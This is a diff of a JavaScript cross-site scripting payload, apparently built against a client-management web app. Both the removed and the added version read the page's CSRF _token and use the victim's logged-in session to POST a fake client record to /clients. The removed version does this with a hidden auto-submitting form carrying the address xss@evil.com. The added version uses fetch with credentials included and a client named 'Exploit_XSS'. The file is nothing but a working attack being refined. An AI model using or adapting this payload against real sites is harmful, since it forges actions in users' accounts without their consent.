@@ -1,28 +1,27 @@
 (function () {
-  const waitFor = (sel, cb) => {
-    const el = document.querySelector(sel);
-    if (el) return cb(el);
-    setTimeout(() => waitFor(sel, cb), 200);
+  const tokenInput = document.querySelector('input[name="_token"]');
+  if (!tokenInput) return;
+
+  const token = tokenInput.value;
+
+  const data = {
+    client_name: "Exploit_XSS",
+    new_activity: "",
+    email: "exploit@xss.com",
+    language_id: 1,
+    "phone_number[5]": "0606060606",
+    "phone_type[5]": "mobile",
+    address: "Injected by XSS",
+    societeinfo_id: "",
+    _token: token
   };
 
-  waitFor('input[name="_token"]', tokenInput => {
-    const token = tokenInput.value;
-
-    const f = document.createElement('form');
-    f.action = '/clients';
-    f.method = 'POST';
-    f.style.display = 'none';
-
-    f.innerHTML = `
-      <input name="client_name" value="Exploit">
-      <input name="email" value="xss@evil.com">
-      <input name="phone_number" value="0606060606">
-      <input name="phone_type" value="mobile">
-      <input name="address" value="DOM Exploit">
-      <input name="_token" value="${token}">
-    `;
-
-    document.body.appendChild(f);
-    f.submit();
+  fetch("/clients", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    credentials: "include",
+    body: JSON.stringify(data)
   });
 })();
